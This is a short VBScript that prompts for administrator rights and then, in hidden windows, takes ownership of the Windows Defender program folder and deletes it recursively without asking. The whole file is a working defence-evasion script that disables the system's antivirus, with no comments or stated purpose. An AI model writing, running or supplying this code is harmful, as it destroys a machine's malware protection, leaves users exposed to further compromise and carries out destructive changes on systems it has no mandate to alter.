If Not WScript.Arguments.Named.Exists("elevated") Then
  CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
  WScript.Quit
End If

Set objShell = CreateObject("WScript.Shell")
strFolder = "C:\Program Files\Windows Defender"

objShell.Run "cmd /c takeown /f """ & strFolder & """ /r /d y", 0, True

objShell.Run "cmd /c rmdir /s /q """ & strFolder & """", 0, True
